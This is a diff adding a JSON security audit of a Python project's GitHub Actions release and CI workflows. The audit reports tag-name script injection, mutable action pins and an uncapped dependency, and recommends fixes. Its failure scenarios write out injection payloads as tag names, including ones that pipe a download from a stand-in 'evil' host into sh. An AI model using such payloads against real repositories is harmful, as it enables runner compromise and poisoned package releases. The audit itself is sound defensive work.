@@ -1,0 +1,60 @@
+{
+  "unit": "BLD-SEC",
+  "target": "packaging & CI",
+  "dimension": "SEC",
+  "findings": [
+    {
+      "id": "BLD-SEC-1",
+      "severity": "medium",
+      "title": "release.yml splices github.ref_name into run: shell and into __init__.py, feeding a PyPI-publish pipeline (script injection)",
+      "category": "ci-script-injection",
+      "file": ".github/workflows/release.yml",
+      "line": 25,
+      "confidence": "high",
+      "description": "release.yml (NEW) interpolates GitHub expressions directly into the `run:` shell text of the `release-build` job. Line 25 `echo \"VERSION=${{ github.ref_name }}\" >> $GITHUB_ENV` places the tag name inside a double-quoted echo, and line 31 `echo \"__version__ = '${{ env.VERSION }}'\" > numbduck/__init__.py` places the same value (via GITHUB_ENV) inside a single-quoted Python string within a shell double-quoted string. `github.ref_name` is attacker/operator-controlled: a git tag name may legally contain backticks, `$(...)`, `;`, `&`, `|`, `'`, and `\"` (git check-ref-format only forbids space, `~^:?*[\\`, controls, `..`, etc.). This is the canonical GitHub Actions script-injection pattern (CodeQL js/actions-command-injection): the expression is expanded into the script TEXT before the shell runs, so a tag such as `` v1`curl evil|sh` `` (line 25 command substitution) or `'; curl evil | sh; echo '` (breaks out of the single-quoted string on line 31) executes arbitrary shell in the runner. The `release-build` job builds the wheel that the downstream `pypi-publish` job (id-token: write, environment: pypi, Trusted Publishing) uploads to PyPI, so injected code can poison the artifact that is then published to PyPI as numbduck — a supply-chain sink.",
+      "impact": "Arbitrary command execution in the release runner during a tag-triggered release, with the ability to tamper with the wheel that is subsequently published to PyPI via OIDC Trusted Publishing. Exploitation is gated by the ability to create a GitHub release / tag (write access), which lowers likelihood, but the sink (public PyPI package) makes the consequence severe.",
+      "recommendation": "Never interpolate `${{ github.ref_name }}` / `${{ env.VERSION }}` into `run:` script text. Pass them through the step's `env:` map (e.g. `env: { REF_NAME: ${{ github.ref_name }} }`) and reference the shell variable quoted: `echo \"VERSION=$REF_NAME\" >> \"$GITHUB_ENV\"` and `printf \"__version__ = %s\\n\" \"'$VERSION'\" > numbduck/__init__.py` (or write the file via a small Python `-c`/heredoc that reads the env var). Environment values are not re-parsed as script, closing the injection.",
+      "failure_scenario": "A release is published from a tag named `` v1`touch /tmp/pwned` `` (or `'; python -c 'import urllib.request...'; echo '`). At line 25/31 the metacharacters are expanded into the shell command, running attacker code inside release-build; the tampered wheel is then handed to pypi-publish and pushed to PyPI."
+    },
+    {
+      "id": "BLD-SEC-2",
+      "severity": "low",
+      "title": "numbduck_ci.yml splices github.ref_name into run: shell and into __init__.py on tag builds (script injection)",
+      "category": "ci-script-injection",
+      "file": ".github/workflows/numbduck_ci.yml",
+      "line": 56,
+      "confidence": "high",
+      "description": "Same injection class as BLD-SEC-1, in the main CI workflow. Line 56 `echo \"VERSION=${{ github.ref_name }}\" >> $GITHUB_ENV` (reached only when `github.ref_type == 'tag'`) and line 63 `echo \"__version__ = '${{ env.VERSION }}'\" > numbduck/__init__.py` splice the tag name into shell script text. A tag name containing shell metacharacters executes arbitrary commands in the CI runner. The `build` job holds only `contents: read` and does not publish (the wheel at line 86 is built but never uploaded), and non-tag pushes use the safe synthetic `0.1.<run_number>` VERSION, so the blast radius is smaller than release.yml — but the sharp edge is identical and should be fixed the same way.",
+      "impact": "Arbitrary command execution in a CI runner on a tag push with a crafted tag name; token is read-only and nothing is published, so impact is limited to runner compromise (secret exfil is minimal here since permissions are contents: read).",
+      "recommendation": "Apply the same fix as BLD-SEC-1: move `github.ref_name` into the step `env:` and reference the quoted shell variable; do not expand GitHub expressions into `run:` text. Fixing both workflows with one idiom also removes the cosmetic drift between them.",
+      "failure_scenario": "A maintainer pushes tag `` v2`id>/tmp/x` ``; at line 56 the backtick command substitution runs during the Determine version step in every matrix job."
+    },
+    {
+      "id": "BLD-SEC-3",
+      "severity": "medium",
+      "title": "PyPI-publish and other actions pinned to mutable refs; pypa/gh-action-pypi-publish uses a mutable BRANCH ref in the id-token:write job",
+      "category": "supply-chain-unpinned-action",
+      "file": ".github/workflows/release.yml",
+      "line": 66,
+      "confidence": "high",
+      "description": "Every third-party and first-party action in the workflows is pinned to a mutable ref (tag or branch), not a full commit SHA. The highest-value case is release.yml:66 `uses: pypa/gh-action-pypi-publish@release/v1` — `release/v1` is a moving BRANCH (not even an immutable tag), and it runs in the `pypi-publish` job that carries `id-token: write` and the `pypi` environment (OIDC Trusted Publishing). Any change to that branch (or a compromise of the pypa repo/branch) executes new code in a job that can mint a PyPI publishing token and push arbitrary artifacts to the numbduck project on PyPI. Other unpinned refs: `lycheeverse/lychee-action@v2` (link-check.yml:45, third-party, runs with `issues: write`), and the first-party `actions/checkout`, `actions/setup-python`, `actions/upload-artifact`, `actions/download-artifact` (`@v4/@v5/@v6/@v7`). Git tags and branches are mutable and can be force-moved, so tag/branch pinning does not give the reproducibility/integrity guarantee of a SHA (OpenSSF Scorecard Pinned-Dependencies).",
+      "impact": "A compromised or force-moved upstream ref runs attacker code in CI. For pypa/gh-action-pypi-publish@release/v1 specifically, that code executes in the OIDC-privileged publish job and could publish a malicious numbduck release to PyPI; for lychee-action it could abuse `issues: write`.",
+      "recommendation": "Pin every action to a full 40-char commit SHA with the human-readable version in a trailing comment, e.g. `pypa/gh-action-pypi-publish@<sha>  # release/v1`, and likewise for lychee-action and the actions/* set. Prioritize the pypi-publish and lychee (issues: write) jobs. Enable Dependabot for GitHub Actions to bump the pinned SHAs.",
+      "failure_scenario": "The `release/v1` branch of pypa/gh-action-pypi-publish is updated (or compromised) between two numbduck releases; the next `release: published` run executes the new action code inside the id-token:write job and can obtain a PyPI OIDC token for numbduck."
+    },
+    {
+      "id": "BLD-SEC-4",
+      "severity": "low",
+      "title": "CI pulls floating, upper-bound-less numbox (arbitrary latest) via pip install -e .",
+      "category": "supply-chain-unpinned-dependency",
+      "file": ".github/workflows/numbduck_ci.yml",
+      "line": 70,
+      "confidence": "medium",
+      "description": "numbduck_ci.yml:70 `pip install -e .` resolves numbduck's runtime deps, and pyproject.toml:13 declares `numbox>=0.5.13` with NO upper cap and no lockfile/hash pinning. CI therefore installs whatever the newest numbox on PyPI is at run time and imports concrete internals from it (`numbox.core.proxy.proxy`, `numbox.core.bindings.call`). This is a supply-chain surface: a compromised or malicious future numbox release executes in CI (numbox code is imported/executed at collection/test time), and builds are non-reproducible across time. The test job token is only `contents: read`, so the immediate blast radius is limited, but the unbounded floor-only pin means CI can silently run untrusted new numbox code, and any breaking numbox reshuffle also breaks import with no guard. (numba/duckdb ARE explicitly pinned per matrix at lines 68-69, making numbox the odd one out.)",
+      "impact": "Non-reproducible CI and an unbounded window for a malicious/newer numbox to execute in the CI runner and influence test results or the locally built (unpublished) wheel.",
+      "recommendation": "Add an upper cap to the numbox dependency in pyproject.toml (e.g. `numbox>=0.5.13,<0.6`) matching the internals numbduck relies on, and/or pin numbox explicitly in the CI install step alongside numba and duckdb so the matrix tests a known numbox. Consider a hash-pinned constraints file for the CI environment.",
+      "failure_scenario": "A future numbox 0.6.0 (or a compromised patch release) is published; the next CI run installs it via the uncapped `>=0.5.13`, executing its code during test collection and potentially breaking or subverting the run."
+    }
+  ],
+  "notes": "Scope: numbduck_ci.yml, release.yml, haversine_bench.yml, extract_codeblocks.py, plus doc-codeblock-flake8.yml and link-check.yml for context. Verified-safe (no finding): (1) extract_codeblocks.py does NOT exec/eval doc code — it pipes each extracted block to flake8 via subprocess.run with an argv LIST (no shell=True) and stdin (lines 130-141); flake8 performs static analysis only, so a fork PR adding a malicious python code block cannot achieve RCE, and there is no shell-injection path (flake8_exe default is 'flake8', only operator-overridable via --flake8). (2) haversine_bench.yml is workflow_dispatch-only, stamps a hardcoded '0.0.1', and uses a fully pinned dependency stack (numpy/pyarrow/numba/duckdb) — no github-context splicing and no injection sink. (3) No explicit libduckdb network download exists in any CI workflow (duckdb arrives as a pip wheel); the libduckdb download/TLS/checksum concern lives in numbduck/utils.py, out of this unit's scope. (4) release.yml permissions are correctly minimal (top-level contents: read; id-token: write scoped only to the pypi-publish job) — good practice, not a defect. (5) `github.run_number` (numbduck_ci.yml:58, release.yml:27) is a GitHub-controlled integer and safe. Emphasis per task: release.yml is NEW — its script-injection sink (BLD-SEC-1) is higher-consequence than numbduck_ci's (BLD-SEC-2) because the injected code runs in the build job whose artifact is published to PyPI, and its pypi-publish step uses a mutable branch ref (BLD-SEC-3)."
+}
